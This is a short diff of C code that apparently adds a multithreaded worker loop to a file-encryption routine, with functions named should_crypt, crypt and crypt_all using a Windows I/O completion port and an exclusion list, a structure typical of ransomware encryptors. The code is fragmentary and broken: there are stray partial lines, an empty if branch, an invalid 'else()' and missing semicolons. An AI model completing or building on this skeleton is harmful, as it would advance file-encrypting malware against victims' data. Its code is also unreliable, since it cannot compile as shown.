@@ -16,6 +16,7 @@ fread()
 for(i 
 
 }
+
 int should_crypt(char *file)
 {
 for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
@@ -27,13 +28,29 @@ return 0;
 }
 return 1;
 }
+void crypt(char *key)
+{
+BOOL result;
+LPOVERLAPPED OverLapped;
+while(1)
+  {
+result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,&OverLapped,INFINITE);
+if(CompletionKey==1)
+
+else()
+
+
+
+
+  }
+}
 
 void crypt_all(char *key)
 {
 DWORD threads;
 Handle thread;
-  completion_port = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
-    if(completion_port)
+  CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
+    if(CompletionPort)
   {
 do
   {
